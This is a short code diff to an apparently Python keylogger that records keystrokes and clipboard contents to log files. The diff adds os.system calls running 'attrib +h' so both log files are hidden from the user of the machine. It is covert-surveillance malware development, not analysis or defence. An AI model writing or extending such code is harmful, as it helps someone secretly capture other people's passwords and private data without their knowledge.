@@ -14,6 +14,13 @@ clipBoard_file = "clipBoardLogs.txt"
 with open(log_file, "w") and open(clipBoard_file, "w"):
     pass
 
+import os
+
+os.system(f'attrib +h "{log_file}"')
+os.system(f'attrib +h "{clipBoard_file}"')
+
+
+
 ThreadRunning = True
 def on_press(key):
     global ThreadRunning
